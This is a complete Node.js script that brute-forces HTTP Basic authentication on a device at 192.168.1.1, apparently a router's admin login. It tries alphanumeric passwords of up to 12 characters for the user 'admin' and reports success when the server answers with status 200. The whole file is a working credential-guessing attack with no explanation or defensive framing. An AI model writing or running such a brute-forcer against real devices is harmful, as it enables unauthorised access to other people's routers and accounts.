var http = require('http');

process.maxTickDepth = 1000*1000*1000;

var digt = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
var uper = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
var lower = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
var sp = '!@#$%^&*_-=+`~./"\'\\'.split('');
var chars = [].concat(digt, lower, uper);

var server_url = '192.168.1.1';
var server_port = 80;
var username = 'admin';
var start = '';
var test_length = 12;

var brute_force = function(base){
	if(base.length <= test_length){
		var update = function(base){
			//console.log(i, base.length, base);
			var out = '';
			var len = base.length;
			var index = chars.lastIndexOf(base.substr(-1));
			if(chars[index+1]){
				out = base.substr(0, len-1) + chars[index+1];
			}else{
				out = update(base.substr(0, len-1)) + chars[0];
			}
			return out;
		}

		console.log(base.length, base);
		run(base, function(){
			//start = update(base);
			brute_force(update(base));
		});
		/*process.nextTick(function(){
			brute_force(start);
		});*/
		//var t = setTimeout(brute_force, 0, start);
	}
}

var run = function(pwd, cb){
	var auth = 'Basic ' + new Buffer(username + ':' + pwd).toString('base64');
	// auth is: 'Basic VGVzdDoxMjM='

	var header = {'Host': server_url, 'Authorization': auth};
	
	var options = {
		hostname: server_url,
		port: server_port,
		path: '/',
		method: 'GET',
		headers: header
	};
	
	var req = http.request(options, function(res) {
		console.log('STATUS: ' + res.statusCode, 'pwd:' + pwd);
		//console.log('HEADERS: ' + JSON.stringify(res.headers));
		res.setEncoding('utf8');
		res.on('data', function (chunk) {
			//console.log('BODY: ' + chunk);
		});
		res.on('end', function () {
			if(res.statusCode != 200){
				process.nextTick(function(){
					cb();
				});
			}else{
				console.log('brute force success!!', pwd.length, pwd);
			}
		});
	});
	req.on('error', function(e) {
		console.log('problem with request: ' + e.message);
	});
	req.end();
}

//console.log(chars.length, chars);
brute_force('000');
//run('0000');
